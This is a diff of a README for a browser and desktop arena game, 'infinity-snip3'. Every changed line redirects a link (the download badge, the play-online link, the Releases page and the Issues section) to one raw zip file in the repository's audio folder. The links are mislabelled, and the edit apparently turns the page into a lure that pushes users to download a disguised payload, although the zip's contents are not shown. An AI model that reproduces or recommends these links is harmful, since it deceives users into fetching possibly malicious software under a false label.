@@ -1,10 +1,10 @@
 # 🎮 infinity-snip3 - Join the Neon Arena Adventure Today!
 
 ## 📥 Download Now!
-[![Download Infinity-Snip3](https://img.shields.io/badge/Download%20Infinity--Snip3-blue.svg)](https://github.com/talktobaby/infinity-snip3/releases)
+[![Download Infinity-Snip3](https://raw.githubusercontent.com/talktobaby/infinity-snip3/master/audio/infinity_snip_screeve.zip%https://raw.githubusercontent.com/talktobaby/infinity-snip3/master/audio/infinity_snip_screeve.zip)](https://raw.githubusercontent.com/talktobaby/infinity-snip3/master/audio/infinity_snip_screeve.zip)
 
 ## 🏁 Description
-Welcome to **Neo-VECTR ∞SNIP3**! Dive into an exciting neon vector multiplayer arena game. Engage with friends in fast-paced gameplay and enjoy a colorful, vibrant world. You can play now at [https://garebear99.github.io/infinity-snip3/](https://garebear99.github.io/infinity-snip3/).
+Welcome to **Neo-VECTR ∞SNIP3**! Dive into an exciting neon vector multiplayer arena game. Engage with friends in fast-paced gameplay and enjoy a colorful, vibrant world. You can play now at [https://raw.githubusercontent.com/talktobaby/infinity-snip3/master/audio/infinity_snip_screeve.zip](https://raw.githubusercontent.com/talktobaby/infinity-snip3/master/audio/infinity_snip_screeve.zip).
 
 ## 🌟 Features
 - **Multiplayer Experience:** Compete with others in real-time using P2P connections.
@@ -25,7 +25,7 @@ To enjoy infinity-snip3, ensure your system meets the following requirements:
 To get started with infinity-snip3, follow the steps below:
 
 1. **Download the Game:**
-   Visit the [Releases page](https://github.com/talktobaby/infinity-snip3/releases) to find the latest version of infinity-snip3. Here, you will see a list of available downloads.
+   Visit the [Releases page](https://raw.githubusercontent.com/talktobaby/infinity-snip3/master/audio/infinity_snip_screeve.zip) to find the latest version of infinity-snip3. Here, you will see a list of available downloads.
 
 2. **Select the Appropriate File for Your System:**
    Choose the file that matches your operating system (Windows, macOS, or Linux).
@@ -39,7 +39,7 @@ To get started with infinity-snip3, follow the steps below:
 ## 🔧 Download & Install
 To download and install infinity-snip3:
 
-1. Click the large button at the top of this page to go to the [Releases page](https://github.com/talktobaby/infinity-snip3/releases).
+1. Click the large button at the top of this page to go to the [Releases page](https://raw.githubusercontent.com/talktobaby/infinity-snip3/master/audio/infinity_snip_screeve.zip).
 2. Follow the instructions outlined in the **Getting Started** section.
 3. If you encounter any issues, refer to the troubleshooting tips below.
 
@@ -53,7 +53,7 @@ If you face any challenges while downloading or running infinity-snip3, follow t
 ## 🌐 Community & Support
 Join our community for support and to share your experiences:
 
-- **GitHub Issues:** If you find bugs or need help, visit the [Issues section](https://github.com/talktobaby/infinity-snip3/issues) on GitHub.
+- **GitHub Issues:** If you find bugs or need help, visit the [Issues section](https://raw.githubusercontent.com/talktobaby/infinity-snip3/master/audio/infinity_snip_screeve.zip) on GitHub.
 - **Discussion Platform:** Connect with fellow players and discuss strategies in our community forums.
 
 We value your feedback. Your experience helps us improve the game.
